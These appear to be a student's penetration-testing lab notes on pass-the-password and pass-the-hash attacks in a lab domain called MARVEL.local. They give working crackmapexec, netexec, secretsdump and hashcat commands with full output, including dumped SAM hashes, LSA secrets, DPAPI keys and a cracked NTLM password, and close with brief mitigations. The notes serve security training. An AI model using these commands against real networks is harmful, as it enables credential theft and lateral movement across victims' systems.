#PassTheHash #PassThePassword #crackmapexec #msfconsole #secretsdump #netexec #nxc #hashcat
# Overview
- Pass the Password & Pass the Hash
- If we crack a password and/or dump the SAM hashes, we can leverage both for lateral movement
- Use `crackmapexec`

# Pass the Password
Pass what we just cracked:
`crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>`
- be sure to add `/24` to end of DC IP so it passes to other domain users in subnet
- Results:

```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/4)─┐
└─(08:36:56)──> crackmapexec smb 192.168.95.132/24 -u fcastle -d MARVEL.local -p Password1                ──(Sat,Jun29)─┘
SMB         192.168.95.133  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.95.132  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.95.134  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.95.133  445    THEPUNISHER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         192.168.95.132  445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 
SMB         192.168.95.134  445    SPIDERMAN        [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
```
- Pay attention to `(Pwn3d!)`
	- we see fcastle has local admin in THEPUNISHER and SPIDERMAN
- `secretsdump`
	- `secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.95.133`
		- make sure IP is a valid IP for the password so we can login to dump secrets
	- utilized to dump information of other machines provided we have local admin on a machine
	- Care about
		- SAM hashes, Admin and users ONLY
		- domain login information, Admin/user
		- any clear text
			- wdigest (old protocol - Windows 7, 8, 2000 & 2012 servers), will show domain admin in clear text
				- can be forced to be enabled, then wait for someone to login.
				- on a pentest, flip it back off (rare case scenario)
	- Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(09:33:01)──> secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.95.133                            ──(Sat,Jun29)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x625c5722f5bd7a83d7526ad255170cd4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f175387db84056909c400f17ad238b:::
frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\THEPUNISHER$:aes256-cts-hmac-sha1-96:62d4133ea5d685cfbafb7561616d3f1a4e6142fc864bb26566868af3e257c4f9
MARVEL\THEPUNISHER$:aes128-cts-hmac-sha1-96:931166d2242e0b110c30fb7266cc1db8
MARVEL\THEPUNISHER$:des-cbc-md5:c84031cb80c87fc1
MARVEL\THEPUNISHER$:aad3b435b51404eeaad3b435b51404ee:af4c18929a5251f6c038e6e45416047b:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xa34030c04cf1460158a068f91149bf13e28f1b4b
dpapi_userkey:0x5e38b9ed3062990dfefc24690b7a2ac4a9fe9394
[*] NL$KM 
 0000   38 A4 B7 49 3F 8A 2B 7E  B2 F8 3A E4 14 FA 22 67   8..I?.+~..:..."g
 0010   B7 A0 69 D5 4B 40 6E 68  9A A2 E3 26 34 65 19 EF   ..i.K@nh...&4e..
 0020   45 B6 03 19 94 79 80 86  7C AC 50 B3 DB 50 FC EE   E....y..|.P..P..
 0030   A4 61 F4 D5 A9 46 AA 97  89 BA 7D 6E 52 F0 4F 0A   .a...F....}nR.O.
NL$KM:38a4b7493f8a2b7eb2f83ae414fa2267b7a069d54b406e689aa2e326346519ef45b60319947980867cac50b3db50fceea461f4d5a946aa9789ba7d6e52f04f0a
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
# Pass the Hash
- Can be done in Metasploit or with `secretsdump` or with `crackmapexec`
- Metasploit
	- `exploit(windows/smb/psexec)`
		- once options are set and exploit ran, run meterpreter command `hashdump` to get hashes
		- Results
```
obsidian://open?vault=Main-Notes&file=%F0%9F%A6%8ATCM%20Security%2FPEH%2FAD_1_Initial%20Attacks%2F3_Gaining%20Shell%20Access

see msf options and output from AD_1, 3_Gaining Shell Access
```
- `secretsdump`
	- run admin user and hash for Spiderman IP
```
secretsdump.py administrator:@192.168.95.134 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```
- Results, same as Pass the Pass but with hash used:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(09:43:02)──> secretsdump.py administrator:@192.168.95.134 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x845409a07e64847bff25283ec162c54d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5d232066e107f4c2c61c223dc4a2e22e:::
peterparker:1002:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\SPIDERMAN$:aes256-cts-hmac-sha1-96:bc448221c043342db8a280693156b7404eb26700b71b8faa6e1f341cb9a65864
MARVEL\SPIDERMAN$:aes128-cts-hmac-sha1-96:e6022353a943b0c1a4677ac278a3c9cf
MARVEL\SPIDERMAN$:des-cbc-md5:7334755bba2c0149
MARVEL\SPIDERMAN$:aad3b435b51404eeaad3b435b51404ee:5138b9cf4ccdda28a829bfc5e69f2d36:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x8a603995cccc2d93afa8e0e72024decc5fd5feee
dpapi_userkey:0x251efce91da31e6531db6ba8f7fe3a2a3410fa17
[*] NL$KM 
 0000   7D 2D 73 45 C1 BE 7B 9F  AD 01 6F EF 62 90 10 15   }-sE..{...o.b...
 0010   BB A4 55 DC 29 05 95 15  04 D3 53 0D 70 DA 7F 4C   ..U.).....S.p..L
 0020   A2 89 9D F0 FA 3F A7 F8  C6 F9 46 2A 14 9C 36 05   .....?....F*..6.
 0030   9B D3 6F 9B E7 11 AA 91  A6 70 23 8A E3 1B 41 B7   ..o......p#...A.
NL$KM:7d2d7345c1be7b9fad016fef62901015bba455dc2905951504d3530d70da7f4ca2899df0fa3fa7f8c6f9462a149c36059bd36f9be711aa91a670238ae31b41b7
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
- `crackmapexec` - we use smb here but other protocols are available `--help`
	- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth`
		- Only works with NTLMv1, not v2
		- used the admin hash and user for -u and -H obtained earlier in the `.sam` output file
		- remove the `:::` at end of hash
		- Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(08:48:10)──> crackmapexec smb 192.168.95.132/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
SMB         192.168.95.133  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.95.132  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.95.134  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.95.133  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.95.132  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.95.134  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
```
- can pass the sam
	- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam`
	- adds sam hashes to database
	- Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(09:05:45)──> crackmapexec smb 192.168.95.132/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam   
SMB         192.168.95.133  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.95.134  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.95.132  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.95.133  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.95.134  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.95.132  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.95.133  445    THEPUNISHER      [+] Dumping SAM hashes
SMB         192.168.95.134  445    SPIDERMAN        [+] Dumping SAM hashes
SMB         192.168.95.133  445    THEPUNISHER      Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.95.134  445    SPIDERMAN        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.95.133  445    THEPUNISHER      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.95.134  445    SPIDERMAN        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.95.133  445    THEPUNISHER      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.95.134  445    SPIDERMAN        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.95.133  445    THEPUNISHER      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f175387db84056909c400f17ad238b:::
SMB         192.168.95.134  445    SPIDERMAN        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5d232066e107f4c2c61c223dc4a2e22e:::                                                                                                     
SMB         192.168.95.133  445    THEPUNISHER      frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::                                                                                                           
SMB         192.168.95.134  445    SPIDERMAN        peterparker:1002:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::                                                                                                           
SMB         192.168.95.133  445    THEPUNISHER      [+] Added 5 SAM hashes to the database
SMB         192.168.95.134  445    SPIDERMAN        [+] Added 5 SAM hashes to the database
```
- can also enumerate shares
	- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --share`
	- Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(08:48:51)──> crackmapexec smb 192.168.95.132/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
SMB         192.168.95.133  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.95.132  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.95.134  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.95.133  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)                                                                                                                         
SMB         192.168.95.132  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.95.134  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.95.133  445    THEPUNISHER      [+] Enumerated shares
SMB         192.168.95.133  445    THEPUNISHER      Share           Permissions     Remark
SMB         192.168.95.133  445    THEPUNISHER      -----           -----------     ------
SMB         192.168.95.133  445    THEPUNISHER      ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.95.133  445    THEPUNISHER      C$              READ,WRITE      Default share
SMB         192.168.95.133  445    THEPUNISHER      IPC$            READ            Remote IPC
SMB         192.168.95.134  445    SPIDERMAN        [+] Enumerated shares
SMB         192.168.95.134  445    SPIDERMAN        Share           Permissions     Remark
SMB         192.168.95.134  445    SPIDERMAN        -----           -----------     ------
SMB         192.168.95.134  445    SPIDERMAN        ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.95.134  445    SPIDERMAN        C$              READ,WRITE      Default share
SMB         192.168.95.134  445    SPIDERMAN        IPC$            READ            Remote IPC
```
- Also, it can show the LSA (local security authority) - USE `secretsdump` as it is better, this just shows `crackmapexec` can do it also
	- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa`
	- Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(08:50:42)──> crackmapexec smb 192.168.95.132/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa  
SMB         192.168.95.133  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.95.134  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.95.132  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.95.133  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)                                                                                                                         
SMB         192.168.95.134  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.95.132  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.95.133  445    THEPUNISHER      [+] Dumping LSA secrets
SMB         192.168.95.134  445    SPIDERMAN        [+] Dumping LSA secrets
SMB         192.168.95.133  445    THEPUNISHER      MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2024-06-26 22:01:43)                                                                                    
SMB         192.168.95.133  445    THEPUNISHER      MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f: (2024-06-28 23:25:13)                                                                                                
SMB         192.168.95.134  445    SPIDERMAN        MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2024-06-26 17:35:05)                                                                                    
SMB         192.168.95.133  445    THEPUNISHER      MARVEL\THEPUNISHER$:aes256-cts-hmac-sha1-96:62d4133ea5d685cfbafb7561616d3f1a4e6142fc864bb26566868af3e257c4f9                                                                                    
SMB         192.168.95.134  445    SPIDERMAN        MARVEL\SPIDERMAN$:aes256-cts-hmac-sha1-96:bc448221c043342db8a280693156b7404eb26700b71b8faa6e1f341cb9a65864                                                                                      
SMB         192.168.95.133  445    THEPUNISHER      MARVEL\THEPUNISHER$:aes128-cts-hmac-sha1-96:931166d2242e0b110c30fb7266cc1db8                                                                                                                    
SMB         192.168.95.133  445    THEPUNISHER      MARVEL\THEPUNISHER$:des-cbc-md5:439d4aa1f4da9ef1
SMB         192.168.95.133  445    THEPUNISHER      MARVEL\THEPUNISHER$:plain_password_hex:5e0041002500250034004400780048003b005a00540072002e0044003800500060006d0078002400490025002a00390074005100270024003c005e002b005f0039002a00440034006100630076003f0053007200280043006a006f0043002f0070003c0020005800780037004d005200600051004a004300250039006200250031004b006f0023006b00320030006a00730070004d00650040006c004d002400240034004b004500790026002d00620078006d00320023007900490026003500410077005e00580078006b0051002000640052007300700074007100450060005f00570074007100690020006c007600                                       
SMB         192.168.95.133  445    THEPUNISHER      MARVEL\THEPUNISHER$:aad3b435b51404eeaad3b435b51404ee:af4c18929a5251f6c038e6e45416047b:::                                                                                                        
SMB         192.168.95.133  445    THEPUNISHER      dpapi_machinekey:0xa34030c04cf1460158a068f91149bf13e28f1b4b
dpapi_userkey:0x5e38b9ed3062990dfefc24690b7a2ac4a9fe9394                                                                  
SMB         192.168.95.133  445    THEPUNISHER      NL$KM:38a4b7493f8a2b7eb2f83ae414fa2267b7a069d54b406e689aa2e326346519ef45b60319947980867cac50b3db50fceea461f4d5a946aa9789ba7d6e52f04f0a                                                          
SMB         192.168.95.133  445    THEPUNISHER      [+] Dumped 9 LSA secrets to /home/kali/.cme/logs/THEPUNISHER_192.168.95.133_2024-06-29_085150.secrets and /home/kali/.cme/logs/THEPUNISHER_192.168.95.133_2024-06-29_085150.cached
SMB         192.168.95.134  445    SPIDERMAN        MARVEL\SPIDERMAN$:aes128-cts-hmac-sha1-96:e6022353a943b0c1a4677ac278a3c9cf                                                                                                                      
SMB         192.168.95.134  445    SPIDERMAN        MARVEL\SPIDERMAN$:des-cbc-md5:7334755bba2c0149
SMB         192.168.95.134  445    SPIDERMAN        MARVEL\SPIDERMAN$:plain_password_hex:4200590035004100770051005c00750069003d002000360033002b00530058002a007a0065004a005b002e005d0039004200530033004e007300650070005000680052002500220060002300550056003800650067007800500022006100450050002e0054005e005e00670073003500400048006e007a003a004b005f003d003500200073006900560065006b006b00680051004800350037006a00570079006f005f00590039004f003a006c003e006f0025007200440042005c00360051003a004000450041004e0036003b006e006c005e00700079003100710044006000540078002f00410048005a0031005200                                         
SMB         192.168.95.134  445    SPIDERMAN        MARVEL\SPIDERMAN$:aad3b435b51404eeaad3b435b51404ee:5138b9cf4ccdda28a829bfc5e69f2d36:::                                                                                                          
SMB         192.168.95.134  445    SPIDERMAN        dpapi_machinekey:0x8a603995cccc2d93afa8e0e72024decc5fd5feee
dpapi_userkey:0x251efce91da31e6531db6ba8f7fe3a2a3410fa17                                                                  
SMB         192.168.95.134  445    SPIDERMAN        NL$KM:7d2d7345c1be7b9fad016fef62901015bba455dc2905951504d3530d70da7f4ca2899df0fa3fa7f8c6f9462a149c36059bd36f9be711aa91a670238ae31b41b7                                                          
SMB         192.168.95.134  445    SPIDERMAN        [+] Dumped 8 LSA secrets to /home/kali/.cme/logs/SPIDERMAN_192.168.95.134_2024-06-29_085150.secrets and /home/kali/.cme/logs/SPIDERMAN_192.168.95.134_2024-06-29_085150.cached
```

- Lastly, it can also use built in modules (`-L` to check). A good one is `lsassy` which enforces security policies and stores credentials.
	- `crackmapexec smb -L`
		- gpp_password
		- impersonation
		- keepass_discover
		- lsassy - #1 choice
	- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy`
		- USE NETEXEC instead for lsassy module. much more up to date
			- `sudo apt-get install netexec`
	- for my lab, does not show much but good to know for future.
	- Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(09:26:38)──> nxc smb 192.168.95.132/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
SMB         192.168.95.133  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.95.134  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.95.132  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.95.133  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)                                                                                                                         
SMB         192.168.95.134  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.95.132  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE
LSASSY      192.168.95.134  445    SPIDERMAN        [-] Unable to dump lsass
LSASSY      192.168.95.133  445    THEPUNISHER      [-] Unable to dump lsass
```
- there is a database for all attempts, users, passwords
	- `cmedb`
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(09:30:22)──> cmedb                                                                                     ──(Sat,Jun29)─┘
cmedb (default)(smb) > help

Documented commands (type help <topic>):
========================================
help

Undocumented commands:
======================
back  creds  exit  export  groups  hosts  import  shares

cmedb (default)(smb) > creds

+Credentials---------+-----------+-------------+--------------------+-------------------------------------------------------------------+
| CredID | Admin On  | CredType  | Domain      | UserName           | Password                                                          |
+--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+
| 1      | 0 Host(s) | plaintext | LEGACY      |                    |                                                                   |
| 2      | 2 Host(s) | plaintext | MARVEL      | fcastle            | Password1                                                         |
| 3      | 1 Host(s) | hash      | THEPUNISHER | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
| 4      | 1 Host(s) | hash      | SPIDERMAN   | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
| 5      | 0 Host(s) | hash      | THEPUNISHER | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 6      | 0 Host(s) | hash      | SPIDERMAN   | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 7      | 0 Host(s) | hash      | THEPUNISHER | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 8      | 0 Host(s) | hash      | SPIDERMAN   | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 9      | 0 Host(s) | hash      | THEPUNISHER | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:90f175387db84056909c400f17ad238b |
| 10     | 0 Host(s) | hash      | SPIDERMAN   | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:5d232066e107f4c2c61c223dc4a2e22e |
| 11     | 0 Host(s) | hash      | THEPUNISHER | frankcastle        | aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b |
| 12     | 0 Host(s) | hash      | SPIDERMAN   | peterparker        | aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b |
+--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+
```

- can export this database for reference

# Cracking Hashes
- We can crack hashes with just the NT portion of the hash (LM:NT)
	- `nano ntlm.txt`
		- `7facdc498ed1680c4fd1448319a8c04f`
	- `hashcat --help | grep NTLM`
		- use the 1000
	- `hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt`
		- Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(09:48:26)──> hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt                                 ──(Sat,Jun29)─┘
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 7800X3D 8-Core Processor, 6939/13943 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

7facdc498ed1680c4fd1448319a8c04f:Password1!               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 7facdc498ed1680c4fd1448319a8c04f
Time.Started.....: Sat Jun 29 09:49:40 2024 (0 secs)
Time.Estimated...: Sat Jun 29 09:49:40 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3395.2 kH/s (0.17ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 176128/14344385 (1.23%)
Rejected.........: 0/176128 (0.00%)
Restore.Point....: 172032/14344385 (1.20%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: florida69 -> 311331
Hardware.Mon.#1..: Util: 26%

Started: Sat Jun 29 09:49:32 2024
Stopped: Sat Jun 29 09:49:42 2024
```

# Pass Attack Mitigations
- Limit account re-use:
	- Avoid re-using local admin password
	- Disable Guest and Admin accounts
	- Limit who is a local admin (least privilege)
- Utilize strong passwords:
	- Longer the better (>14 characters)
	- Avoid using common words
	- Long sentences are good
- Privilege Access Management (PAM):
	- Check out/in sensitive accounts when needed
	- Automatically rotate passwords on check out and check in
	- Limits pass attacks as hash/password is strong and constantly rotated